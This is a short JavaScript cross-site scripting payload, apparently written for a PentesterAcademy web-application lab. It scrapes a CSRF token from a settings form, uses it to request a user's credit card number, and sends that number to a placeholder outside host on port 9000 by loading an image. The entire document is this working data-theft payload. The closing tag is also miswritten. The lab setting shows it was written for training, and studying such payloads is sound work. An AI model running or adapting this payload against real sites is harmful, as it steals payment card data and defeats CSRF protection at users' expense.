<script>
  // http://pentesteracademylab.appspot.com/lab/webapp/jfp/19
  var r1 = new XMLHttpRequest(); /* 1st XHR */
  var r2 = new XMLHttpRequest(); /* 2nd XHR */
  var csrf_token = '';
  var uid = '';

  /* invoked when GET is made, carving out the cc from the response */
  r2.onreadystatechange = function() {
    if (r2.readyState == 4 && r2.status == 200) {
      var html = r2.responseXML;
      cc = html.getElementById("result").innerHTML;
      console.log(cc); /* write to console, needs this to work? */
      new Image().src = "http://X.X.X.X:9000/?cc=" + cc;
    }
  }
  /* invoked when GET is made to /lab/webapp/jfp/19/getform */
  r1.onreadystatechange = function() {
    if (r1.readyState == 4 && r1.status == 200) {
      var html2 = r1.responseXML;
      csrf_token = html2.forms[0].elements[1].value;
      alert(csrf_token);

      /* make a request to get the creditcard numer through the form */
      r2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token,true);
      r2.responseType = "document";
      r2.send();
    }
  }
  var link = document.getElementById("settings");
  var uid = link.innerHTML.split(":")[1]; /* fetch UID from link */
  r1.open("GET", link.href, true); /* make request to /lab/webapp/jfp/19/getform */
  r1.responseType = "document"; /* must specify the response type */
  r1.send();
<script>
